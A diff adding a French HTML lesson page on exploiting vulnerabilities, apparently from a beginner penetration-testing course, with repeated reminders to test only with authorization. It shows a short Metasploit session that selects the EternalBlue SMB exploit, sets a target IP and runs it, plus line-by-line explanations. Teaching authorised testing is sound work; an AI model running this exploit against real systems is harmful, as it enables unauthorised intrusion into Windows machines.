@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Leçon 7 : Exploitation des failles</title>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #111; 
+      color: #00ff88; 
+      margin: 0; 
+      padding: 20px; 
+      line-height: 1.6;
+    }
+    h1, h2, h3 { color: #00ff88; }
+    pre { 
+      background: #222; 
+      padding: 15px; 
+      border-radius: 10px; 
+      overflow-x: auto; 
+      margin-bottom: 20px;
+    }
+    code { color: #ffcc00; }
+    a { color: #00ff88; text-decoration: none; font-weight: bold; }
+    a:hover { color: #fff; }
+    ul { margin-left: 20px; margin-bottom: 20px; }
+    p { margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+  <h1>Leçon 7 : Exploitation des failles</h1>
+
+  <h2>Introduction</h2>
+  <p>L’exploitation des failles consiste à tester des vulnérabilités identifiées afin de vérifier la sécurité d’un système. Tout doit être fait dans un cadre éthique et légal pour éviter des conséquences juridiques.</p>
+
+  <h2>Principes de base</h2>
+  <ul>
+    <li><strong>Exploits connus :</strong> utiliser des vulnérabilités documentées pour tester un système.</li>
+    <li><strong>Scripts personnalisés :</strong> créer ou adapter des scripts pour tester des failles spécifiques.</li>
+    <li><strong>Précautions légales :</strong> ne jamais tester un système sans autorisation explicite.</li>
+  </ul>
+
+  <h2>Exemple pratique : Utiliser Metasploit</h2>
+  <pre><code>
+# Lancer Metasploit
+msfconsole
+
+# Sélectionner un exploit connu (EternalBlue pour Windows)
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Définir l'adresse IP de la cible
+set RHOST 192.168.1.10
+
+# Lancer l'exploitation
+run
+
+# Explications :
+# - msfconsole : interface principale de Metasploit
+# - use : choisir l'exploit à utiliser
+# - set RHOST : définir la cible
+# - run : exécuter l'exploit
+  </code></pre>
+
+  <h2>Explications détaillées</h2>
+  <ul>
+    <li><code>msfconsole</code> : ouvre la console Metasploit, qui contient des milliers d’exploits et outils de test.</li>
+    <li><code>use exploit/…</code> : sélectionne l’exploit spécifique pour la vulnérabilité que vous souhaitez tester.</li>
+    <li><code>set RHOST</code> : définit l’adresse IP de la machine cible.</li>
+    <li><code>run</code> : lance l’exploitation, qui simule l’attaque de manière contrôlée.</li>
+  </ul>
+
+  <h2>Conseils pour débutants</h2>
+  <ul>
+    <li>Testez toujours sur un laboratoire ou un réseau local que vous possédez.</li>
+    <li>Documentez vos tests et résultats pour créer un rapport clair.</li>
+    <li>Ne partagez jamais vos exploits ou scripts pour attaquer des systèmes sans autorisation.</li>
+    <li>Commencez par des exploits simples et bien documentés avant de passer à des tests plus complexes.</li>
+  </ul>
+
+  <h2>Résumé</h2>
+  <p>Cette leçon vous a présenté comment exploiter des failles de façon éthique avec Metasploit. Vous devez maintenant être capable de :</p>
+  <ul>
+    <li>Comprendre le fonctionnement de Metasploit et de ses exploits.</li>
+    <li>Tester des vulnérabilités dans un environnement sécurisé.</li>
+    <li>Respecter les règles légales et éthiques lors de vos tests.</li>
+  </ul>
+
+  <p><a href="index.html">⬅ Retour à l'accueil</a></p>
+</body>
+  </html>
